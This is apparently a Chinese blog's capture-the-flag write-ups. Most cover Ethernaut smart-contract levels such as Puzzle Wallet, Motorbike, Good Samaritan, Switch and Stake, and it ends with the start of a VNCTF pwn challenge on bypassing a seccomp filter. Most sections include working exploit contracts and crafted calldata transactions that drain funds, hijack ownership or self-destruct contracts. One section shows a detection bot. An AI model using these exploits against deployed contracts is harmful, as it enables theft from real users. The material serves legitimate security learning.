<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Token3 is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">    constructor() ERC20(&quot;Token3&quot;, &quot;Token3&quot;) &#123; &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address account, uint256 value) external &#123;</span><br><span class="line">        _mint(account, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function burn(address account, uint256 value) external &#123;</span><br><span class="line">        _burn(account, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> token1 = <span class="keyword">await</span> contract.<span class="title function_">token1</span>();</span><br><span class="line"><span class="keyword">let</span> token2 = <span class="keyword">await</span> contract.<span class="title function_">token2</span>();</span><br><span class="line"><span class="keyword">let</span> token3 = <span class="string">&#x27;Token Contract Addr&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// token3.mint(player, 2);</span></span><br><span class="line"><span class="comment">// token3.mint(instance, 1);</span></span><br><span class="line"><span class="comment">// token3.approve(instance, 1000);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// approve token1 and token2</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">approve</span>(instance, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// swap all token1</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token3, token1, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// check token1 balance in contract</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(token1, instance)).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// token3.burn(instane, 1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// swap all token2</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token3, token2, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// check token2 balance in contract</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(token2, instance)).<span class="title function_">toString</span>();</span><br><span class="line"><span class="comment">// 这里会发现 token2 并不是 0，而是 50。这是因为我们灌进去的 token3 贬值了</span></span><br><span class="line"><span class="comment">// 所以我们需要用更多的 token3 把 token2 换出来</span></span><br><span class="line"><span class="comment">// 我当时没算好，所以 swap(token2,token3,3) 之后又 swap(token2,token3,7)</span></span><br><span class="line"><span class="comment">// 总共是用我的 10 个 token2 换了 instance 的 0 个 token3 出来</span></span><br><span class="line"><span class="comment">// 用下面这行应该也能达标</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token2, token3, <span class="number">10</span>);</span><br><span class="line"><span class="comment">// 这样 instance 里 token2 : token3 = 60 : 3 = 20 : 1</span></span><br><span class="line"><span class="comment">// 我们只需要用 3 个 token3 就可以换出 instance 里 剩下的 60 个 token2 了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// -&gt; remix 里 token3.mint(player, 3);</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token3, token2, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>
<p>做完这道题我才理解代币到底是干啥的...比如说有很值钱的 token1 与
token2，在 dex 交换时没有检测好币类，让非法币混入了池里，token1/2 就会被
token3 大量替代</p>
<p>同样，如果没有做好浮点数约束，也会造成资金的损失..</p>
<p>链子还是蛮有意思的 :D</p>
<h2 id="puzzle-wallet">24 Puzzle Wallet</h2>
<blockquote>
<p>漏洞类型：代理合约slot冲突</p>
</blockquote>
<blockquote>
<p>twm：代理合约存储槽冲突</p>
</blockquote>
<p>这代码好长..这之后的题做的都懵懵的，之后对合约有一定的了解之后再回过头来看吧。</p>
<p>exp:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// invoke PuzzleProxy.proposeNewAdmin() to change `owner` in PuzzleWallet</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: <span class="string">&#x27;a63767460000000000000000000000009a80a78bebE92EF9cDfC4CA116fC4925237fDbd0&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// add player to whitelist</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">addToWhitelist</span>(player);</span><br><span class="line"></span><br><span class="line"><span class="comment">// multicall calldata</span></span><br><span class="line"><span class="keyword">let</span> multicall = <span class="string">&#x27;ac9650d8000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000a4ac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a4ac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// invoke multicall x2, and each multicall will invoke deposit</span></span><br><span class="line"><span class="comment">// msg.value will be used twice (add 0.002 eth), but we only need to send it once (0.001 eth)</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: multicall, <span class="attr">value</span>: <span class="title function_">toWei</span>(<span class="string">&#x27;0.001&#x27;</span>)&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check balance of player, should be 0.002 eth</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balances</span>(player)).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// transfer contract balance to player</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">execute</span>(player, <span class="title function_">toWei</span>(<span class="string">&#x27;0.002&#x27;</span>), <span class="string">&#x27;0x0&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check balance of contract, shoule be zero</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balances</span>(instance)).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// change `admin` in PuzzleProxy</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setMaxBalance</span>(player);</span><br></pre></td></tr></table></figure>
<h2 id="motorbike">25 Motorbike</h2>
<blockquote>
<p>漏洞类型：代理合约context错误</p>
</blockquote>
<blockquote>
<p>twm：利用代理合约上下文绕过限制</p>
</blockquote>
<p>这道题使用了 ERC1967 ，ERC1967
提供了一种不改变合约地址而升级合约的标准方式。而在 ERC1967
中牵扯到了两种合约：代理合约与逻辑合约。</p>
<p>代理合约的作用是保持合约地址不变，同时通过更新 _IMPLEMENTATION_SLOT
中的地址来改变其指向的逻辑合约，实现合约的升级。在本题中，Motorbike
是代理合约（proxy contract），它在 constructor
函数中设置了逻辑合约的地址，并将逻辑合约初始化；还在 fallback
函数中捕获所有与合约接口不匹配的调用，并移交给 logic 合约去处理。而
engine 是逻辑合约（implementation/logic contract）。</p>
<p>以上是基础知识，我们来看一下这道题该怎么做。</p>
<p>首先，题目要求我们 selfdestruct 掉 engine 这个合约，而 engine
合约中并没有 selfdestruct 这个函数。但通过阅读代码我们可以看到，engine
合约在 _upgradeToAndCall 函数中调用了 “升级后的合约地址的 data
这一函数选择器代表的函数”，如果我们可以把升级后的合约地址指向我们的恶意合约
evil，然后在 evil 中设置 selfdestruct，那么就可以达成我们的目的了。</p>
<p>但题目还设置了一条防线：调用 upgradeToAndCall 的用户必须是
upgrader，而 motorbike 在实例化的时候就已经调用过一次 initialize 了，而
initializer 这个modifier
限定了这个初始化函数只能被调用一次。看起来我们没有办法改变
upgrader了。</p>
<p>但实际上，proxy contract的上下文中，initialize
函数确实已经被调用过了，但在 engine 这个 logic contract
的上下文中并没有被调用过。因此我们可以直接找到 engine
的合约地址，然后主动调用 initialize 函数。</p>
<p>exp 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Engine &#123;</span><br><span class="line">    function initialize() external;</span><br><span class="line">    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">    Engine private engine;</span><br><span class="line"></span><br><span class="line">    constructor(address target) &#123;</span><br><span class="line">        engine = Engine(target);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    function hack() external &#123;</span><br><span class="line">        engine.initialize();</span><br><span class="line">        engine.upgradeToAndCall(address(this), abi.encodeWithSelector(this.destruct.selector));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function destruct() external &#123;</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但这道题貌似现在出了些认证问题，我们可以在<a
href="https://sepolia.etherscan.io/address/0x5f32626248fc2a2af86c775bfd9a2e7b8b2f2a4d#internaltx">etherscan</a>上看到这个合于确实调用了自毁函数，但好像没有执行自会，因此仍然提交不通过..</p>
<h2 id="doubleentrypoint">26 DoubleEntryPoint</h2>
<p>这道题的主要合约为 DoubleEntryPoint（简称DEP），该合约持有 DET
这种代币，同时设计了 CryptoVault 这个合约用来管理 DET 代币，在
CryptoVault 中用户可以清理走合约中的非 underlying 代币（underlying
代币也是合约自定义的，是用来维护合约的、不可清理的代币）。而本题目想让我们利用<code>Forta</code>来监控
DEP 的行为，防止 underlying 代币被清理，从而导致合约不可用。</p>
<p>当我们调用 sweepToken(LGT_address) 时，sweepToken 会调用
LegacyToken.transfer，</p>
<p>而此时 LegacyToken.delegate 已经被设置为了 DEP 合约的实例地址，因此
LegacyToken.transfer 会调用 DEP.delegateTransfer(sweptTokensRecipient,
token.balanceOf(CryptoVault.address), CryptoVault.address)，</p>
<p>此时如果 CryptoVault 中存在
DET，就会被全数转走。这是一个典型的“代币双重入口”漏洞，即通过操纵一个代币的转账逻辑间接影响另一个代币的行为。</p>
<p>防御起来也很简单，只要让 DEP 中的 delegateTransfer 的 origSender
不要是 CryptoVault 就好了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface IDetectionBot &#123;</span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IForta &#123;</span><br><span class="line">    function setDetectionBot(address detectionBotAddress) external;</span><br><span class="line">    function notify(address user, bytes calldata msgData) external;</span><br><span class="line">    function raiseAlert(address user) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AlertBot is IDetectionBot &#123;</span><br><span class="line">    address private cryptoVault;</span><br><span class="line">    IForta iforta;</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        cryptoVault = 0xe0B40efa39E4B61a9141AFbe95B54a113A1000CE;</span><br><span class="line">        iforta = IForta(0xb76adbE51242C49306D9C9EB929F8f3E508c5f82);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external override &#123;</span><br><span class="line">        address origSender;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            origSender := calldataload(0xa8)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(origSender == cryptoVault) &#123;</span><br><span class="line">            IForta(msg.sender).raiseAlert(user);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="good-samaritan">27 Good Samaritan</h2>
<p>这个合约是一个“好心的 Samaritan 人”(简称 S人)模板，这个
S人有一个钱包和一种代币，并且初始就有一百万个币。并且如果你问他要10个币，他会无私的捐款给你；即使他也穷得响叮当了、穷的不多于10个币，S人仍然会把自己剩余的钱捐给你。</p>
<p>现在我们是恶意用户，想要诈骗S人这一百万个币，但如果通过donate10来诈骗，需要调用十万次requestDonation，因此我们需要想一个走
catch 途径的方式。</p>
<p>只需要实现 INotifyable 接口, 然后在 amount 等于 10 的时候 revert
NotEnoughBalance error, 这样 GoodSamaritan 就会再触发一次转账,
将钱包内所有的钱转走。</p>
<p>exp如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">error NotEnoughBalance();</span><br><span class="line"></span><br><span class="line">interface INotifyable &#123;</span><br><span class="line">    function notify(uint256 amount) external; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface GoodSamaritan &#123;</span><br><span class="line">    function requestDonation() external returns (bool enoughBalance);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack is INotifyable &#123;</span><br><span class="line">    address target = 0xed5Ad44F9274b4be60e2c017FB72be94a8D1857D;</span><br><span class="line">    GoodSamaritan gs;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        gs = GoodSamaritan(target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        gs.requestDonation();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function notify(uint256 amount) pure external &#123;</span><br><span class="line">        if(amount == 10) &#123;</span><br><span class="line">            revert NotEnoughBalance();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="gatekeeper-three">28 GateKeeper Three</h2>
<p>首先我们发现这个构造函数 construct0r
居然写错了，并且还用的public，所以我们写个 evilContract 调用一下
construct0r 就能将 owner 设置成 evilContract 的地址。</p>
<p>GateOne 要求调用者是 owner，但源头不是owner。很简单，我们通过
evilContract 操作即可。</p>
<p>GateTwo 要求 allowEntrance 为 true。只要 createTrick 与 getAllowance
在同一次 function（交易） 内执行，block.timestamp 就是一样的。</p>
<p>GateThree 要求该合约超过 0.001 ether，并且发给 evilContract 0.001
ether 失败。</p>
<p>exp 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperThree &#123;</span><br><span class="line">    function construct0r() external;</span><br><span class="line">    function createTrick() external;</span><br><span class="line">    function getAllowance(uint256 _password) external;</span><br><span class="line">    function enter() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract evilContract &#123;</span><br><span class="line">    address target = 0x85bBddCADB43AB650d91eb9658681aD70c721407;</span><br><span class="line">    GatekeeperThree victim;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        victim = GatekeeperThree(target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() payable external &#123;</span><br><span class="line">        require(msg.value &gt; 0.001 ether);</span><br><span class="line">        // gateOne</span><br><span class="line">        victim.construct0r();</span><br><span class="line"></span><br><span class="line">        // gateTwo</span><br><span class="line">        victim.createTrick();</span><br><span class="line">        victim.getAllowance(block.timestamp);</span><br><span class="line"></span><br><span class="line">        // gateThree</span><br><span class="line">        payable(address(victim)).transfer(msg.value);</span><br><span class="line">        </span><br><span class="line">        // hack</span><br><span class="line">        victim.enter();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="switch">29 Switch</h2>
<p>这道题要求我们掌握 CALLDATA 是如何编码的。所以我们先来恶补一下
calldata 的知识。</p>
<p>当合约A调用合约B，这条调用信息会被打包成一条交易信息，广播给区块链上的每个节点，并放入这些节点的交易池中；当前一个区块验证/挖掘完毕，所有节点会选择自己池中的一组交易信息，初步验证gas、余额等信息后生成一个候选block，在生成候选区块的同时，节点会启动EVM执行交易；当满足PoW后，节点会广播自己的候选区块让其他人验证；</p>
<p>而合约A调用B时，A会构建 CALLDATA，而B则通过 CALLDATA 来判断 A
调用了自己的哪一个 function。</p>
<p>现在我们已经了解了 CALLDATA
的应用场景，接下来我们看一下它长什么样子（编码方式）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xbabecafe  -&gt;  (keccak(function))[:4]</span><br><span class="line">00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000  -&gt;  其他数据</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>上面是一个例子，CALLDATA
由四字节的函数签名和数据组成，具体怎么编码可以看<a
href="https://cylab.be/blog/334/solidity-abi-encoding-explained">这篇</a></p>
<p>回到这道题，我们肯定是需要调用 <code>turnSwitchOn</code>
来打开开关，但是这个函数限定了
onlythis，也就是说我们需要让目标合约自己调用 turnSwitchOn</p>
<p>可以看到 <code>flipSwitch</code> 有自己调用自己的 call
命令，但是需要绕过一些 modifier</p>
<p>首先我们来看一下这几个函数的签名：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;turnSwitchOff()&quot;</span>)</span><br><span class="line"><span class="string">&#x27;0x20606e15b70f0894e0e83ae9593ae406a94abb5adcfcf0d169c6784f02198dc3&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;turnSwitchOn()&quot;</span>)</span><br><span class="line"><span class="string">&#x27;0x76227e12b0f9524a1cdf8423a63057ea998f18f618846d452f0caf8339009449&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;flipSwitch(bytes)&quot;</span>)</span><br><span class="line"><span class="string">&#x27;0x30c13adec91872243f797e6f9ca682ad108854e1f771ca6bee08c6550c7198d7&#x27;</span></span><br></pre></td></tr></table></figure>
<p>我们希望调用 <code>flipSwitch</code>
函数，因此我们会先在头部四字节写下<code>0x30c13ade</code>，然后因为
bytes 是动态变量，因此我们会用 32 字节来记录 offset，32字节记录
length，然后是实际 data</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x30c13ade</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000020 &lt;- offset</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000length &lt;- length</span><br><span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx &lt;- 实际 data</span><br></pre></td></tr></table></figure>
<p>接着我们希望调用 <code>turnSwitchOn</code> 函数，所以实际 data
处我们希望是 turnSwitchOn 的标识符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x30c13ade</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000020 &lt;- offset</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000004 &lt;- length </span><br><span class="line">76227e1200000000000000000000000000000000000000000000000000000000 &lt;- 实际 data</span><br></pre></td></tr></table></figure>
<p>但 filpSwtich 被 onlyOff
修饰了，我们需要绕过这个修饰符。而这个修饰符中使用
calldatacopy(t,s,f)，将 offset = s 处的 f 个字节拷贝到 t 地址处。而
<code>calldatacopy(selector, 68, 4)</code> 正好是我们现在 76227e12
的位置，我们需要在这写下 keccak256("turnSwitchOff()") 也就是
20606e15</p>
<p>之后，我们修改一下offset就能改变data的位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x30c13ade</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000060 &lt;- offset</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 &lt;- padding </span><br><span class="line">20606e1500000000000000000000000000000000000000000000000000000000 &lt;- bypass</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000004 &lt;- length</span><br><span class="line">76227e1200000000000000000000000000000000000000000000000000000000 &lt;- 实际 data</span><br></pre></td></tr></table></figure>
<p>exp如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: <span class="string">&quot;30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="higherorder">30 HigherOrder</h2>
<p>跟上一题差不多，也是 calldata 可以被我们人为操控进而达成一些目的</p>
<p>soliditylang 上两个 Yul 函数的介绍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sstore(p, v)     storage[p] := v</span><br><span class="line">calldataload(p)  从位置p开始的调用数据（32字节）</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;registerTreasury(uint8)&quot;</span>)</span><br><span class="line"><span class="string">&#x27;0x211c85abbbaf9884d77268c011d56de0d4b5e816ac06c84275c1aadd7eab81c5&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;claimLeadership()&quot;</span>)</span><br><span class="line"><span class="string">&#x27;0x5b3e8fe738d49181e7fc102771232e813fa1ae1daa69c894601a0170e188ff95&#x27;</span></span><br></pre></td></tr></table></figure>
<p>所以我们构造data为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x211c85ab</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000100</span><br></pre></td></tr></table></figure>
<p>就可以绕过 treasury &gt; 255 的检测了。</p>
<p>然后调用 claimLeadership 就行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x5b3e8fe7</span><br></pre></td></tr></table></figure>
<p>exp 如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: <span class="string">&quot;0x211c85ab0000000000000000000000000000000000000000000000000000000000000100&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: <span class="string">&quot;0x5b3e8fe7&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="stake">31 Stake</h2>
<p>本题要求我们：</p>
<ol type="1">
<li>Stake 合约的 ETH 大于 0</li>
<li>totalStaked 需要大于合约的 ETH</li>
<li>我们必须成为 Staker</li>
<li>我们的 staked balance 为 0</li>
</ol>
<p>StakeWETH 中的两个 abi：</p>
<p>0xdd62ed3e = allowance 0x23b872dd = transferFrom</p>
<p>对于第一点，我们可以调用 StakeETH
向合约转账，当然也可以调用自毁函数进行强制转账</p>
<p>对于第二点，由于 StakeWETH 函数被调用后没有检查 WETH.call
是否成功，所以我们可以实现零成本增加 totalStake</p>
<p>对于第三点，我们只需要调用 StakeETH 就能顺带成为 Staker</p>
<p>对于第四点，只要调用 unStake 全部取出就好了。</p>
<p>我们可以看以下几点：</p>
<p>getBalance(stake): Stake 合约的 ETH</p>
<p>totalStaked: totalStaked</p>
<p>Stakers[player]: 我们是不是 Staker</p>
<p>UserStake[player]: 我们的 staked balance</p>
<p>所以我们的逻辑如下：</p>
<p>用其他合约调用 WETH.allowance(0.0012 ether)，再用其他合约调用
StakeWETH(0.0012 ether)，同时自毁这个合约。这样，在不增加
UserStake[player] 的前提下，增加了 totalStaked，同时增加了合于存储的
ETH，满足了第一二点</p>
<p>我们自己调用 StakeETH(0.0011 ether), 增加了 totalStaked 和 Stake
合约的 ETH，将我们自己设置为 Staker，满足了第三点</p>
<p>我们自己再调用 Unstak(0,0011 ether)，将我们的 staked balance
清零，满足了第四点</p>
<p>exp 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.26;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/interfaces/IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface Stake &#123;</span><br><span class="line">    function StakeETH() external payable;</span><br><span class="line">    function StakeWETH(uint256 amount) external returns (bool);</span><br><span class="line">    function Unstake(uint256 amount) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address target = 0xF5B752EfD47fDCd58da29a3389FF4E08484B6a45;</span><br><span class="line">    address weth_address = 0xCd8AF4A0F29cF7966C051542905F66F5dca9052f;</span><br><span class="line">    Stake stake;</span><br><span class="line">    IERC20 weth;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        weth = IERC20(weth_address);</span><br><span class="line">        stake = Stake(target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        require(msg.value == 0.001 ether);</span><br><span class="line">        weth.approve(address(stake), 0.0012 ether);</span><br><span class="line">        stake.StakeWETH(0.0012 ether);</span><br><span class="line">        selfdestruct(payable(address(stake)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">await contract.StakeETH(&#123;value: toWei(&quot;0.0011&quot;)&#125;);</span><br><span class="line">await contract.Unstake(toWei(&quot;0.0011&quot;));</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Smart Contract</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2024VNCTF_pwn_wp</title>
    <url>/posts/40260.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
没注意到今天还有一个 vnctf😭赛后复盘一下
</blockquote>
<span id="more"></span>
<h1 id="pwn">pwn</h1>
<h2 id="shellcode">shellcode</h2>
<p>签到题，禁用了 execve 相关函数，还禁用了所有与 read 和 socket send
相关的函数，也就是 ORW 缺 R</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x11 0xc000003e  if (A != ARCH_X86_64) goto 0019</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x0e 0xffffffff  if (A != 0xffffffff) goto 0019</span><br><span class="line"> 0005: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0019</span><br><span class="line"> 0006: 0x15 0x0c 0x00 0x00000011  if (A == pread64) goto 0019</span><br><span class="line"> 0007: 0x15 0x0b 0x00 0x00000013  if (A == readv) goto 0019</span><br><span class="line"> 0008: 0x15 0x0a 0x00 0x00000028  if (A == sendfile) goto 0019</span><br><span class="line"> 0009: 0x15 0x09 0x00 0x0000002c  if (A == sendto) goto 0019</span><br><span class="line"> 0010: 0x15 0x08 0x00 0x0000002e  if (A == sendmsg) goto 0019</span><br><span class="line"> 0011: 0x15 0x07 0x00 0x0000003b  if (A == execve) goto 0019</span><br><span class="line"> 0012: 0x15 0x06 0x00 0x00000127  if (A == preadv) goto 0019</span><br><span class="line"> 0013: 0x15 0x05 0x00 0x00000142  if (A == execveat) goto 0019</span><br><span class="line"> 0014: 0x15 0x04 0x00 0x00000147  if (A == preadv2) goto 0019</span><br><span class="line"> 0015: 0x15 0x03 0x00 0x000001a9  if (A == 0x1a9) goto 0019</span><br><span class="line"> 0016: 0x15 0x02 0x00 0x000001aa  if (A == 0x1aa) goto 0019</span><br><span class="line"> 0017: 0x15 0x01 0x00 0x000001ab  if (A == 0x1ab) goto 0019</span><br><span class="line"> 0018: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
<p>但是这种不是<code>!=</code>的 seccomp 代表了有很多其他的可能性。</p>
<p>我们知道 mmap 可以不通过 IO
直接将磁盘文件映射到内存空间当中，所以本题我们考虑用 open - mmap - write
的方式来打印 flag 文件</p>
